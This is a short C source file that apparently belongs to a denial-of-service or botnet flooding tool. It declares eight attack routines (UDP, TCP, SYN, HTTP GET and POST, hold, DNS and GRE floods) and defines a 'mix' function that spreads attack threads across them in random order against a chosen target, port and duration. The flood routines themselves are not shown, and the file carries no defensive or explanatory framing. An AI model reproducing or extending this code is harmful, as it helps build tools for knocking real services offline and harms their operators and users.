#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// Forward declarations
void attack_udp(char *target, int port, int duration, int threads);
void attack_tcp(char *target, int port, int duration, int threads);
void attack_syn(char *target, int port, int duration, int threads);
void attack_httpget(char *target, int port, int duration, int threads);
void attack_httppost(char *target, int port, int duration, int threads);
void attack_hold(char *target, int port, int duration, int threads);
void attack_dns(char *target, int port, int duration, int threads);
void attack_gre(char *target, int port, int duration, int threads);

void attack_mix(char *target, int port, int duration, int threads) {
    int methods[] = {0, 1, 2, 3, 4, 5, 6, 7};
    int num_methods = sizeof(methods) / sizeof(methods[0]);
    
    int per_method = threads / num_methods;
    if (per_method < 1) per_method = 1;

    // Randomly select methods
    for (int i = 0; i < num_methods; i++) {
        int idx = rand() % num_methods;
        int temp = methods[i];
        methods[i] = methods[idx];
        methods[idx] = temp;
    }

    for (int i = 0; i < num_methods; i++) {
        int t = (i == num_methods - 1) ? threads - (per_method * i) : per_method;
        if (t < 1) continue;
        
        switch(methods[i]) {
            case 0: attack_udp(target, port, duration, t); break;
            case 1: attack_tcp(target, port, duration, t); break;
            case 2: attack_syn(target, port, duration, t); break;
            case 3: attack_httpget(target, port, duration, t); break;
            case 4: attack_httppost(target, port, duration, t); break;
            case 5: attack_hold(target, port, duration, t); break;
            case 6: attack_dns(target, port, duration, t); break;
            case 7: attack_gre(target, port, duration, t); break;
        }
    }
}